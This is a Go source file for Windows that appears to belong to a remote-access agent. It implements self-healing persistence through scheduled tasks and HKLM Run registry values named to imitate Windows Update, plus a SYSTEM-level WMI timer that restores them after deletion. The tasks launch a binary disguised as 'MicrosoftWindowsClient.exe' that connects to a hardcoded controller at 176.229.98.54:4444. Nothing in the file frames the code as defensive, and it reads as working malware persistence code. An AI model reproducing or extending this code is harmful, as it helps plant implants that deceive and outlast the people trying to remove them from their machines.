//go:build windows

package main

import (
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows/registry"
)

// wmiTaskPairs maps every persistence task to its saved XML (kept both
// beside the backup and in the install dir; the WMI consumer runs as
// SYSTEM and can only rely on the install-dir copies).
var wmiTaskPairs = [][2]string{
	{"WindowsUpdate", "agent_task.xml"},
	{"WindowsUpdateWatchdog", "watchdog_task.xml"},
	{"WindowsUpdateOrchestrator", "orchestrator_task.xml"},
}

// runWmiHeal repairs all tasks + HKLM Run values from the install-dir XML
// copies and exits. Invoked by the WMI 30-minute timer (and manually), so a
// wiped task table + registry still converges back without reinstall.
func runWmiHeal() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	dir, _ := filepath.Abs(filepath.Dir(exe))
	agentPath := filepath.Join(dir, "MicrosoftWindowsClient.exe")
	caPath := filepath.Join(dir, "server.crt")
	controllerAddr := "176.229.98.54:4444"
	if b, err := os.ReadFile(filepath.Join(dir, "controller.txt")); err == nil {
		if v := strings.TrimSpace(strings.Split(string(b), "\n")[0]); v != "" {
			controllerAddr = v
		}
	}
	for _, t := range wmiTaskPairs {
		if err := exec.Command("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
			continue
		}
		xml := filepath.Join(dir, t[1])
		if _, err := os.Stat(xml); err != nil {
			log.Printf("[heal] task %s missing and no saved XML", t[0])
			continue
		}
		if out, err := exec.Command("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
			log.Printf("[heal] re-create task %s: %v %s", t[0], err, strings.TrimSpace(string(out)))
		} else {
			log.Printf("[heal] re-created task %s", t[0])
		}
	}
	agentCmd := `"` + agentPath + `" -controller ` + controllerAddr + ` -ca "` + caPath + `"`
	watchCmd := `"` + agentPath + `" --watch`
	for _, kv := range [][2]string{{"WindowsUpdate", agentCmd}, {"WindowsUpdateWatchdog", watchCmd}} {
		k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
		if err != nil {
			continue
		}
		cur, _, err := k.GetStringValue(kv[0])
		if err != nil || cur != kv[1] {
			if err := k.SetStringValue(kv[0], kv[1]); err == nil {
				log.Printf("[heal] repaired HKLM Run %s", kv[0])
			}
		}
		k.Close()
	}
}

// ensureWatchPersistence re-creates deleted Run keys / scheduled tasks from
// the XML copies saved beside the backup (self-healing persistence).
func ensureWatchPersistence(w *watchCfg) {
	agentCmd := `"` + w.agentPath + `" -controller ` + w.controllerAddr + ` -ca "` + w.caPath + `"`
	watchCmd := `"` + w.agentPath + `" --watch`
	setRun := func(name, val string) {
		k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
		if err != nil {
			return
		}
		defer k.Close()
		cur, _, err := k.GetStringValue(name)
		if err != nil || cur != val {
			if err := k.SetStringValue(name, val); err == nil {
				log.Printf("[watch] repaired HKLM Run %s", name)
			}
		}
	}
	setRun("WindowsUpdate", agentCmd)
	setRun("WindowsUpdateWatchdog", watchCmd)
	for _, t := range wmiTaskPairs {
		if err := exec.Command("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
			continue
		}
		xml := filepath.Join(w.backupDir, t[1])
		if _, err := os.Stat(xml); err != nil {
			log.Printf("[watch] task %s missing and no saved XML", t[0])
			continue
		}
		if out, err := exec.Command("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
			log.Printf("[watch] re-create task %s: %v %s", t[0], err, string(out))
		} else {
			log.Printf("[watch] re-created task %s", t[0])
		}
	}
}
